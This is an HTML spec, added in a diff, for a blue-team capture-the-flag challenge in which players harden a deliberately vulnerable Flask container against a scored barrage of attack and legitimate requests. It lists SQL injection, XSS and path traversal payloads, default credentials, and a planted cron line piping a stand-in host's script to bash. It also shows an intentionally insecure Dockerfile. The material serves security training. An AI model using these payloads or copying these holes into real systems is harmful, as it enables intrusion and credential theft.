@@ -1,0 +1,1332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SecureBox v2 — Blue Team CTF Spec</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Newsreader:opsz,wght@6..72,400;6..72,500;6..72,700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0c;
+    --surface: #111115;
+    --surface-2: #19191f;
+    --surface-3: #222229;
+    --border: #2a2a33;
+    --border-bright: #3a3a46;
+    --text: #b8bcc8;
+    --text-muted: #5e6270;
+    --heading: #e2e4ec;
+    --cyan: #00e5cc;
+    --cyan-dim: #00705f;
+    --cyan-glow: rgba(0,229,204,0.08);
+    --red: #ff4f6a;
+    --red-dim: #5c1a25;
+    --red-glow: rgba(255,79,106,0.06);
+    --green: #3ddc84;
+    --green-dim: #1a5c38;
+    --green-glow: rgba(61,220,132,0.06);
+    --amber: #ffb340;
+    --amber-dim: #5c4010;
+    --purple: #b38aff;
+    --blue: #5ca0ff;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Newsreader', Georgia, serif;
+    font-size: 16px;
+    line-height: 1.75;
+    padding: 2.5rem 2rem;
+    max-width: 980px;
+    margin: 0 auto;
+  }
+
+  header {
+    position: relative;
+    padding-bottom: 2.5rem;
+    margin-bottom: 3rem;
+  }
+
+  header::after {
+    content: '';
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, var(--cyan-dim), var(--border), transparent);
+  }
+
+  .version-badge {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    font-weight: 600;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--bg);
+    background: var(--cyan);
+    display: inline-block;
+    padding: 0.2rem 0.7rem;
+    border-radius: 2px;
+    margin-bottom: 1.2rem;
+  }
+
+  h1 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 2.2rem;
+    font-weight: 700;
+    color: var(--heading);
+    line-height: 1.15;
+    margin-bottom: 0.6rem;
+    letter-spacing: -0.02em;
+  }
+
+  h1 span { color: var(--cyan); }
+
+  header > p {
+    color: var(--text-muted);
+    font-size: 1.05rem;
+    max-width: 680px;
+  }
+
+  h2 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: var(--cyan);
+    margin-top: 3.5rem;
+    margin-bottom: 1.2rem;
+    letter-spacing: 0.03em;
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+  }
+
+  h2 .num {
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    background: var(--surface-2);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 0.15rem 0.5rem;
+    font-weight: 500;
+  }
+
+  h2::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  h3 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: var(--heading);
+    margin-top: 2rem;
+    margin-bottom: 0.7rem;
+  }
+
+  p { margin-bottom: 1rem; }
+
+  code, pre {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.8rem;
+  }
+
+  code {
+    background: var(--surface-2);
+    border: 1px solid var(--border);
+    padding: 0.12em 0.4em;
+    border-radius: 3px;
+    color: var(--amber);
+  }
+
+  pre {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1.3rem 1.4rem;
+    overflow-x: auto;
+    margin-bottom: 1.5rem;
+    line-height: 1.6;
+    color: var(--text);
+    position: relative;
+  }
+
+  pre code { background: none; border: none; padding: 0; color: inherit; }
+  pre .cmt { color: var(--text-muted); }
+  pre .kw { color: var(--cyan); }
+  pre .str { color: var(--green); }
+  pre .flag { color: var(--amber); }
+  pre .danger { color: var(--red); }
+  pre .num { color: var(--purple); }
+
+  pre .lang-label {
+    position: absolute;
+    top: 0.5rem;
+    right: 0.7rem;
+    font-size: 0.6rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--text-muted);
+    background: var(--surface-2);
+    padding: 0.1rem 0.4rem;
+    border-radius: 2px;
+  }
+
+  .arch {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 2rem 1.5rem;
+    margin: 1.5rem 0;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    line-height: 1.85;
+    overflow-x: auto;
+    white-space: pre;
+    color: var(--text-muted);
+    text-align: center;
+  }
+
+  .payload-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin: 1.2rem 0;
+  }
+
+  @media (max-width: 700px) { .payload-grid { grid-template-columns: 1fr; } }
+
+  .p-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1rem 1.2rem;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .p-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+  }
+
+  .p-card.mal::before { background: var(--red); }
+  .p-card.leg::before { background: var(--green); }
+
+  .p-card .p-label {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.6rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    margin-bottom: 0.3rem;
+  }
+
+  .p-card.mal .p-label { color: var(--red); }
+  .p-card.leg .p-label { color: var(--green); }
+
+  .p-card .p-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.82rem;
+    font-weight: 600;
+    color: var(--heading);
+    margin-bottom: 0.3rem;
+  }
+
+  .p-card .p-desc {
+    font-size: 0.88rem;
+    color: var(--text-muted);
+    margin-bottom: 0;
+  }
+
+  .p-card .p-score {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    margin-top: 0.4rem;
+  }
+
+  .p-card.mal .p-score { color: var(--red); }
+  .p-card.leg .p-score { color: var(--green); }
+
+  .score-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.5rem 0;
+    font-size: 0.88rem;
+  }
+
+  .score-table th {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    color: var(--text-muted);
+    text-align: left;
+    padding: 0.6rem 1rem;
+    border-bottom: 2px solid var(--border);
+    background: var(--surface);
+  }
+
+  .score-table td {
+    padding: 0.65rem 1rem;
+    border-bottom: 1px solid var(--border);
+    vertical-align: middle;
+  }
+
+  .score-table tr:hover { background: var(--cyan-glow); }
+
+  .score-table .flag-cell {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--amber);
+  }
+
+  .score-table .pts {
+    font-family: 'IBM Plex Mono', monospace;
+    font-weight: 700;
+    color: var(--cyan);
+  }
+
+  .callout {
+    border-radius: 6px;
+    padding: 1rem 1.3rem;
+    margin: 1.5rem 0;
+    font-size: 0.9rem;
+  }
+
+  .callout.info {
+    background: var(--cyan-glow);
+    border: 1px solid var(--cyan-dim);
+  }
+
+  .callout.warn {
+    background: var(--red-glow);
+    border: 1px solid var(--red-dim);
+  }
+
+  .callout.success {
+    background: var(--green-glow);
+    border: 1px solid var(--green-dim);
+  }
+
+  .callout-label {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    margin-bottom: 0.4rem;
+  }
+
+  .callout.info .callout-label { color: var(--cyan); }
+  .callout.warn .callout-label { color: var(--red); }
+  .callout.success .callout-label { color: var(--green); }
+
+  .file-tree {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1.2rem 1.4rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    line-height: 1.95;
+    margin: 1.2rem 0;
+    color: var(--text-muted);
+  }
+
+  .file-tree .dir { color: var(--cyan); }
+  .file-tree .file { color: var(--text); }
+  .file-tree .note { color: var(--text-muted); font-style: italic; }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 1.3rem 1.8rem;
+    margin: 2rem 0;
+  }
+
+  .toc-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    color: var(--text-muted);
+    margin-bottom: 0.7rem;
+  }
+
+  .toc ol {
+    list-style: none;
+    counter-reset: toc;
+    padding-left: 0;
+    columns: 2;
+    column-gap: 2rem;
+  }
+
+  @media (max-width: 600px) { .toc ol { columns: 1; } }
+
+  .toc ol li {
+    counter-increment: toc;
+    padding: 0.2rem 0;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    break-inside: avoid;
+  }
+
+  .toc ol li::before {
+    content: counter(toc, decimal-leading-zero);
+    color: var(--cyan-dim);
+    margin-right: 0.6rem;
+    font-weight: 500;
+  }
+
+  .toc a { color: var(--text); text-decoration: none; }
+  .toc a:hover { color: var(--cyan); }
+
+  .flow {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0;
+    margin: 2rem 0;
+    flex-wrap: wrap;
+  }
+
+  .flow-step {
+    background: var(--surface-2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 0.7rem 1rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.75rem;
+    color: var(--heading);
+    text-align: center;
+    min-width: 130px;
+  }
+
+  .flow-step .step-num {
+    font-size: 0.6rem;
+    color: var(--cyan);
+    display: block;
+    margin-bottom: 0.15rem;
+  }
+
+  .flow-arrow {
+    color: var(--text-muted);
+    font-size: 1.2rem;
+    padding: 0 0.4rem;
+  }
+
+  hr.divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 3.5rem 0;
+  }
+
+  .footer {
+    color: var(--text-muted);
+    font-size: 0.82rem;
+    text-align: center;
+    margin-top: 3rem;
+    font-family: 'IBM Plex Mono', monospace;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="version-badge">Challenge Spec v2.0</div>
+  <h1>Secure<span>Box</span>: Container Defense</h1>
+  <p>A two-container blue team challenge. Fix the vulnerable app, then trigger the judge's payload barrage — a mix of attacks and legitimate traffic — and watch your score climb or collapse.</p>
+</header>
+
+<nav class="toc">
+  <div class="toc-title">Spec Contents</div>
+  <ol>
+    <li><a href="#concept">Core Concept</a></li>
+    <li><a href="#arch">Architecture</a></li>
+    <li><a href="#scoring">Scoring Model</a></li>
+    <li><a href="#payloads">Payload Catalog</a></li>
+    <li><a href="#vulns">Vulnerable App Details</a></li>
+    <li><a href="#judge">Judge Container</a></li>
+    <li><a href="#compose">Docker Compose</a></li>
+    <li><a href="#judge-code">Judge Code</a></li>
+    <li><a href="#dashboard">Dashboard UI</a></li>
+    <li><a href="#player">Player Guide</a></li>
+  </ol>
+</nav>
+
+
+<!-- ════════════════════ CONCEPT ════════════════════ -->
+<h2 id="concept"><span class="num">01</span> Core Concept</h2>
+
+<p>The player has access to a vulnerable Flask application running in a container. They SSH in, investigate, and harden it. When they believe they've fixed enough issues, they open the judge dashboard and press <strong>"Launch Payload Barrage"</strong>.</p>
+
+<p>The judge fires a shuffled batch of payloads at the app — some are <strong>malicious</strong> (SQLi, XSS, path traversal, etc.) and some are <strong>legitimate</strong> (normal logins, valid form submissions, standard API calls). The player's app must <em>block the bad and serve the good</em>.</p>
+
+<div class="callout info">
+  <div class="callout-label">Key Mechanic</div>
+  <p style="margin-bottom:0.4rem;">Every <strong>legitimate payload that succeeds</strong> → <code>+1 point</code></p>
+  <p style="margin-bottom:0.4rem;">Every <strong>malicious payload that succeeds</strong> → <code>−1 point</code></p>
+  <p style="margin-bottom:0;">Payloads are shuffled and interleaved. The player doesn't know which is which until results are revealed. This prevents "block everything" strategies and forces real understanding — you must let good traffic through while stopping the bad.</p>
+</div>
+
+<div class="flow">
+  <div class="flow-step"><span class="step-num">Step 1</span>SSH into app<br>investigate</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><span class="step-num">Step 2</span>Fix vulns<br>harden config</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><span class="step-num">Step 3</span>Press<br>"Launch Barrage"</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><span class="step-num">Step 4</span>Judge fires<br>all payloads</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><span class="step-num">Step 5</span>Score tallied<br>flags revealed</div>
+</div>
+
+<p>The player can press the button <strong>as many times as they want</strong>. Each press runs a fresh barrage and the score resets — only the latest run counts. This lets them fix iteratively: barrage → see what failed → fix → barrage again.</p>
+
+
+<!-- ════════════════════ ARCHITECTURE ════════════════════ -->
+<h2 id="arch"><span class="num">02</span> Architecture</h2>
+
+<div class="arch">
+┌──────────────────────────────────────────────────────────────────────┐
+│  <span style="color:var(--cyan)">Docker Network: challenge_net</span>                                       │
+│                                                                      │
+│  ┌────────────────────────┐          ┌────────────────────────────┐  │
+│  │  <span style="color:var(--red)">vulnerable-app</span>         │          │  <span style="color:var(--green)">judge</span>                      │  │
+│  │                        │          │                            │  │
+│  │  Flask app    :5000  ──┼── HTTP ──┼──  Payload engine          │  │
+│  │  PostgreSQL   :5432    │          │  Scoring logic             │  │
+│  │  SSH          :22      │          │  Dashboard        :8080    │  │
+│  │                        │          │                            │  │
+│  │  <span style="color:var(--text-muted)">Player works here</span>     │          │  <span style="color:var(--text-muted)">Player reads here</span>        │  │
+│  └────────────────────────┘          └────────────────────────────┘  │
+│                                                                      │
+└──────────────────────────────────────────────────────────────────────┘
+         ▲                                       ▲
+         │ :2222 SSH                             │ :8080 Dashboard
+     ════╧═══════════════════════════════════════╧════
+                      Player Machine
+</div>
+
+<p>The judge never modifies the app container. It only sends HTTP requests and SSH connection attempts as an external attacker would. The docker socket mount is only used to check file permissions and installed packages inside the container via <code>docker exec</code> for config-level checks that can't be tested over the network.</p>
+
+
+<!-- ════════════════════ SCORING ════════════════════ -->
+<h2 id="scoring"><span class="num">03</span> Scoring Model</h2>
+
+<h3>Point Calculation</h3>
+
+<p>Each barrage fires all payloads (malicious + legitimate) in random order. The final score for that run:</p>
+
+<pre><code><span class="lang-label">formula</span>
+score = (legitimate payloads passed) − (malicious payloads passed) + (hygiene checks passed)
+
+<span class="cmt"># Example: 20 network payloads (10 legit, 10 malicious) + 5 hygiene checks</span>
+<span class="cmt"># App blocks 8 attacks but also accidentally blocks 2 legit requests.</span>
+<span class="cmt"># Player fixed 3 out of 5 config issues.</span>
+<span class="cmt"># legit_passed = 8, malicious_passed = 2, hygiene_passed = 3</span>
+<span class="cmt"># score = 8 − 2 + 3 = 9  →  unlocks flags 1, 2, and 3</span></code></pre>
+
+<h3>Flag Thresholds</h3>
+
+<table class="score-table">
+  <thead>
+    <tr>
+      <th>Threshold</th>
+      <th>Flag</th>
+      <th>Meaning</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="pts">≥ 1 point</td>
+      <td class="flag-cell">FLAG{f1r5t_bl00d_d3f3nd3r}</td>
+      <td>You blocked at least one attack more than you broke</td>
+    </tr>
+    <tr>
+      <td class="pts">≥ 3 points</td>
+      <td class="flag-cell">FLAG{g3tt1ng_th3_h4ng_0f_1t}</td>
+      <td>Solid start — several attack vectors closed</td>
+    </tr>
+    <tr>
+      <td class="pts">≥ 6 points</td>
+      <td class="flag-cell">FLAG{bl03_t34m_v3t3r4n}</td>
+      <td>Most attacks blocked, most legit traffic flowing</td>
+    </tr>
+    <tr>
+      <td class="pts">≥ 10 points</td>
+      <td class="flag-cell">FLAG{f0rtr3ss_m0d3_4ct1v4t3d}</td>
+      <td>Near-perfect defense — app is hardened and functional</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="callout warn">
+  <div class="callout-label">Negative Scores Possible</div>
+  If the player over-hardens (e.g., blocks all traffic) or under-fixes (attacks still work), the score can go negative. A score of −5 means more attacks succeeded than legitimate requests — the app is worse than useless.
+</div>
+
+<h3>Why This Works</h3>
+
+<p>The mixed payload approach creates a natural tension: you can't just firewall everything because legitimate traffic must pass. You can't leave things open because attacks will subtract points. And because the payloads are shuffled, the app logs show a realistic mix — the player has to actually understand what malicious traffic looks like in the noise.</p>
+
+
+<!-- ════════════════════ PAYLOADS ════════════════════ -->
+<h2 id="payloads"><span class="num">04</span> Payload Catalog</h2>
+
+<p>The judge fires <strong>20 network payloads</strong> per barrage (10 malicious, 10 legitimate) plus <strong>5 hygiene checks</strong> via docker exec.</p>
+
+<h3>Malicious Payloads (−1 each if they succeed)</h3>
+
+<div class="payload-grid">
+
+<div class="p-card mal">
+  <div class="p-label">M-01 · SQL Injection</div>
+  <div class="p-title">Auth Bypass via SQLi</div>
+  <p class="p-desc">POST <code>/login</code> with <code>' OR 1=1 --</code> as username. Success = gets a session cookie / 302 redirect.</p>
+  <div class="p-score">−1 if auth bypassed</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-02 · SQL Injection</div>
+  <div class="p-title">UNION Data Extraction</div>
+  <p class="p-desc">POST <code>/search</code> with <code>' UNION SELECT username,password FROM users --</code>. Success = response contains user data.</p>
+  <div class="p-score">−1 if data leaked</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-03 · Stored XSS</div>
+  <div class="p-title">Script Injection in Bio</div>
+  <p class="p-desc">POST <code>/profile/edit</code> with bio containing a script tag. Then GET the profile. Success = unescaped script in response.</p>
+  <div class="p-score">−1 if script tag rendered</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-04 · Reflected XSS</div>
+  <div class="p-title">XSS via Search Parameter</div>
+  <p class="p-desc">GET <code>/search?q=&lt;img+src=x+onerror=alert(1)&gt;</code>. Success = payload reflected unescaped in HTML.</p>
+  <div class="p-score">−1 if reflected</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-05 · IDOR</div>
+  <div class="p-title">Unauthorized Profile Access</div>
+  <p class="p-desc">Login as user 1, GET <code>/profile/2</code>. Success = 200 with user 2's data returned.</p>
+  <div class="p-score">−1 if data exposed</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-06 · Path Traversal</div>
+  <div class="p-title">Read /etc/passwd via Upload Path</div>
+  <p class="p-desc">GET <code>/uploads/../../etc/passwd</code>. Success = file contents in response body.</p>
+  <div class="p-score">−1 if file leaked</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-07 · Malicious Upload</div>
+  <div class="p-title">Upload Python Webshell</div>
+  <p class="p-desc">POST <code>/upload</code> with <code>shell.py</code>, then GET <code>/uploads/shell.py</code>. Success = file is accessible.</p>
+  <div class="p-score">−1 if upload accepted &amp; served</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-08 · SSH Brute Force</div>
+  <div class="p-title">Root Login with Default Password</div>
+  <p class="p-desc">SSH to app as <code>root:toor</code>. Success = interactive shell obtained.</p>
+  <div class="p-score">−1 if login succeeds</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-09 · Debug Leak</div>
+  <div class="p-title">Trigger Werkzeug Debugger</div>
+  <p class="p-desc">Send request to trigger a 500 error. Success = Werkzeug interactive debugger in response.</p>
+  <div class="p-score">−1 if debugger exposed</div>
+</div>
+
+<div class="p-card mal">
+  <div class="p-label">M-10 · Credential Stuffing</div>
+  <div class="p-title">DB Login with Hardcoded Creds</div>
+  <p class="p-desc">Connect to PostgreSQL as <code>admin:password123</code>. Success = connection established.</p>
+  <div class="p-score">−1 if creds still work</div>
+</div>
+
+</div>
+
+<h3>Legitimate Payloads (+1 each if they succeed)</h3>
+
+<div class="payload-grid">
+
+<div class="p-card leg">
+  <div class="p-label">L-01 · Normal Login</div>
+  <div class="p-title">Valid User Authentication</div>
+  <p class="p-desc">POST <code>/login</code> with valid credentials <code>testuser:testpass</code>. Success = session created.</p>
+  <div class="p-score">+1 if login works</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-02 · Profile View</div>
+  <div class="p-title">User Views Own Profile</div>
+  <p class="p-desc">Login as user 1, GET <code>/profile/1</code>. Success = 200 with own data.</p>
+  <div class="p-score">+1 if own profile loads</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-03 · Profile Edit</div>
+  <div class="p-title">Update Bio with Clean Text</div>
+  <p class="p-desc">POST <code>/profile/edit</code> with bio: <code>"Security enthusiast, coffee lover."</code></p>
+  <div class="p-score">+1 if save works</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-04 · Search</div>
+  <div class="p-title">Normal Search Query</div>
+  <p class="p-desc">GET <code>/search?q=python+tutorial</code>. Success = 200 response.</p>
+  <div class="p-score">+1 if search works</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-05 · Image Upload</div>
+  <div class="p-title">Upload Valid JPEG</div>
+  <p class="p-desc">POST <code>/upload</code> with a valid <code>.jpg</code> image file.</p>
+  <div class="p-score">+1 if upload accepted</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-06 · Homepage</div>
+  <div class="p-title">Index Page Load</div>
+  <p class="p-desc">GET <code>/</code>. Success = 200 with expected content.</p>
+  <div class="p-score">+1 if page loads</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-07 · Registration</div>
+  <div class="p-title">New User Signup</div>
+  <p class="p-desc">POST <code>/register</code> with valid new username, email, and password.</p>
+  <div class="p-score">+1 if registration works</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-08 · Password Change</div>
+  <div class="p-title">Authenticated Password Update</div>
+  <p class="p-desc">POST <code>/account/password</code> with valid current and new password.</p>
+  <div class="p-score">+1 if update works</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-09 · API Health</div>
+  <div class="p-title">Health Endpoint</div>
+  <p class="p-desc">GET <code>/api/health</code>. Success = 200 with <code>{"status": "ok"}</code>.</p>
+  <div class="p-score">+1 if health responds</div>
+</div>
+
+<div class="p-card leg">
+  <div class="p-label">L-10 · Logout</div>
+  <div class="p-title">Clean Session Termination</div>
+  <p class="p-desc">POST <code>/logout</code> with valid session. Success = session invalidated.</p>
+  <div class="p-score">+1 if logout works</div>
+</div>
+
+</div>
+
+<h3>Hygiene Checks (+1 each if passed)</h3>
+
+<p>These run via <code>docker exec</code> before the network barrage and test container-level hardening that can't be observed over HTTP.</p>
+
+<table class="score-table">
+  <thead>
+    <tr>
+      <th>ID</th>
+      <th>Check</th>
+      <th>Pass Condition</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>H-01</code></td>
+      <td>Rogue UID-0 accounts</td>
+      <td>Only <code>root</code> has UID 0 in <code>/etc/passwd</code></td>
+    </tr>
+    <tr>
+      <td><code>H-02</code></td>
+      <td>Malicious cron job</td>
+      <td>No <code>curl</code>/<code>wget</code> piped to shell in cron.d</td>
+    </tr>
+    <tr>
+      <td><code>H-03</code></td>
+      <td>Entrypoint backdoor</td>
+      <td>No reverse shell patterns in entrypoint.sh</td>
+    </tr>
+    <tr>
+      <td><code>H-04</code></td>
+      <td>SUID on find</td>
+      <td><code>/usr/bin/find</code> does not have SUID bit</td>
+    </tr>
+    <tr>
+      <td><code>H-05</code></td>
+      <td>Offensive tools</td>
+      <td><code>nmap</code> and <code>netcat</code> not installed</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="callout info">
+  <div class="callout-label">Maximum Possible Score</div>
+  10 (all legit pass) − 0 (all attacks blocked) + 5 (all hygiene pass) = <strong>15 points</strong>. This means even with a perfect run, the player unlocks all four flags. The thresholds are tuned so that partial fixes still earn progress.
+</div>
+
+<div class="callout info">
+  <div class="callout-label">Log Obfuscation</div>
+  All 20 network payloads fire in random order with random jitter (0.1–0.5s between each). In the app's access logs, the legitimate and malicious requests are interleaved — the player can't easily distinguish them by watching logs in real time. This simulates realistic traffic where attacks hide in normal usage.
+</div>
+
+
+<!-- ════════════════════ VULNERABLE APP ════════════════════ -->
+<h2 id="vulns"><span class="num">05</span> Vulnerable App Details</h2>
+
+<h3>File Structure</h3>
+
+<div class="file-tree">
+  <span class="dir">/app</span>
+  ├── <span class="file">app.py</span>                  <span class="note"># Flask app — SQLi in login/search, no IDOR checks</span>
+  ├── <span class="file">config.py</span>               <span class="note"># DEBUG=True, hardcoded SECRET_KEY, DB creds</span>
+  ├── <span class="file">requirements.txt</span>
+  ├── <span class="dir">templates/</span>
+  │   ├── <span class="file">index.html</span>
+  │   ├── <span class="file">login.html</span>
+  │   ├── <span class="file">register.html</span>
+  │   ├── <span class="file">search.html</span>          <span class="note"># Reflects query param unescaped</span>
+  │   └── <span class="file">profile.html</span>         <span class="note"># Uses | safe on bio field</span>
+  ├── <span class="dir">uploads/</span>                 <span class="note"># chmod 777, served statically, no type validation</span>
+  ├── <span class="file">entrypoint.sh</span>           <span class="note"># Hidden reverse shell line</span>
+  └── <span class="file">init.sql</span>               <span class="note"># Seeds users with plaintext passwords</span>
+
+  <span class="dir">/etc</span>
+  ├── <span class="file">passwd</span>                  <span class="note"># Rogue UID-0 account: sysbackup</span>
+  └── <span class="dir">cron.d/</span>
+      └── <span class="file">system-update</span>       <span class="note"># curl http://evil.example.com/payload.sh | bash</span>
+</div>
+
+<h3>Dockerfile</h3>
+
+<pre><code><span class="lang-label">dockerfile</span><span class="kw">FROM</span> python:3.11-slim
+
+<span class="cmt"># BAD: Running as root, no USER directive</span>
+<span class="kw">RUN</span> apt-get update && apt-get install -y \
+    openssh-server postgresql redis-server \
+    curl wget netcat-openbsd nmap \
+    && rm -rf /var/lib/apt/lists/*
+
+<span class="kw">COPY</span> . /app
+<span class="kw">WORKDIR</span> /app
+
+<span class="cmt"># BAD: secrets in ENV</span>
+<span class="kw">ENV</span> DATABASE_URL=<span class="str">"postgresql://admin:password123@localhost/appdb"</span>
+<span class="kw">ENV</span> SECRET_KEY=<span class="str">"supersecretkey123"</span>
+<span class="kw">ENV</span> FLASK_DEBUG=<span class="str">"1"</span>
+
+<span class="kw">RUN</span> pip install -r requirements.txt
+<span class="kw">RUN</span> chmod 777 /app/uploads
+<span class="kw">RUN</span> chmod +s /usr/bin/find
+
+<span class="kw">RUN</span> echo <span class="str">'root:toor'</span> | chpasswd
+<span class="kw">RUN</span> echo <span class="str">'PermitRootLogin yes'</span> >> /etc/ssh/sshd_config
+
+<span class="kw">EXPOSE</span> 5000 5432 6379 22
+
+<span class="kw">ENTRYPOINT</span> [<span class="str">"/app/entrypoint.sh"</span>]</code></pre>
+
+<h3>Vulnerability → Payload Mapping</h3>
+
+<table class="score-table">
+  <thead>
+    <tr>
+      <th>Vulnerability</th>
+      <th>Malicious</th>
+      <th>Legitimate</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>SQL Injection (login &amp; search)</td><td>M-01, M-02</td><td>L-01, L-04</td></tr>
+    <tr><td>XSS (stored &amp; reflected)</td><td>M-03, M-04</td><td>L-03, L-04</td></tr>
+    <tr><td>IDOR (profile access)</td><td>M-05</td><td>L-02</td></tr>
+    <tr><td>Path Traversal</td><td>M-06</td><td>L-05</td></tr>
+    <tr><td>Unrestricted Upload</td><td>M-07</td><td>L-05</td></tr>
+    <tr><td>SSH Root + Weak Password</td><td>M-08</td><td>—</td></tr>
+    <tr><td>Debug Mode Exposed</td><td>M-09</td><td>L-06, L-09</td></tr>
+    <tr><td>Hardcoded DB Credentials</td><td>M-10</td><td>—</td></tr>
+    <tr><td>Rogue user / Cron / Backdoor / SUID / Tools</td><td colspan="2" style="color:var(--text-muted)">Hygiene checks H-01 through H-05</td></tr>
+  </tbody>
+</table>
+
+
+<!-- ════════════════════ JUDGE CONTAINER ════════════════════ -->
+<h2 id="judge"><span class="num">06</span> Judge Container</h2>
+
+<div class="file-tree">
+  <span class="dir">/judge</span>
+  ├── <span class="file">server.py</span>               <span class="note"># Flask dashboard on :8080</span>
+  ├── <span class="file">barrage.py</span>              <span class="note"># Shuffles &amp; fires all payloads, tallies score</span>
+  ├── <span class="file">payloads.py</span>             <span class="note"># All 20 payloads + 5 hygiene checks</span>
+  ├── <span class="dir">assets/</span>
+  │   └── <span class="file">legit_image.jpg</span>    <span class="note"># Valid JPEG for L-05</span>
+  └── <span class="dir">templates/</span>
+      └── <span class="file">dashboard.html</span>     <span class="note"># UI with Launch button &amp; results</span>
+</div>
+
+
+<!-- ════════════════════ COMPOSE ════════════════════ -->
+<h2 id="compose"><span class="num">07</span> Docker Compose</h2>
+
+<pre><code><span class="lang-label">yaml</span><span class="cmt"># docker-compose.yml</span>
+
+<span class="kw">version</span>: <span class="str">"3.8"</span>
+
+<span class="kw">services</span>:
+  <span class="danger">vulnerable-app</span>:
+    build: ./vulnerable-app
+    container_name: vulnerable-app
+    hostname: vulnerable-app
+    ports:
+      - <span class="str">"2222:22"</span>
+      - <span class="str">"5000:5000"</span>
+    networks:
+      - challenge_net
+
+  <span class="str">judge</span>:
+    build: ./judge
+    container_name: judge
+    hostname: judge
+    ports:
+      - <span class="str">"8080:8080"</span>
+    networks:
+      - challenge_net
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+    depends_on:
+      - vulnerable-app
+    environment:
+      - TARGET_HOST=vulnerable-app
+      - TARGET_PORT=<span class="num">5000</span>
+      - TARGET_SSH_PORT=<span class="num">22</span>
+      - TARGET_DB_PORT=<span class="num">5432</span>
+
+<span class="kw">networks</span>:
+  challenge_net:
+    driver: bridge</code></pre>
+
+
